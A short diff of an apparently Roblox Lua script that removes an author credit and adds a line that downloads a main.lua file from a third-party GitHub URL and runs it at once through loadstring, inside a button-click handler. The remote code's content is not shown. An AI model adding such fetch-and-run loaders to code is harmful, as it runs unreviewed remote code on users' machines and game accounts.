@@ -87,7 +87,6 @@ local function onErrorNotification()
 end
 
 local function handleIconButtonClick()
--- Made by Me and Uwutitantvwoman--
  
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -101,7 +100,7 @@ if player and player:FindFirstChild("Backpack") then
         end
     end
 end
-loadstring(game:HttpGet(''))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Herobrine697448/KJ/refs/heads/main/main.lua'))()
     local character = player.Character
     if not character then
         return
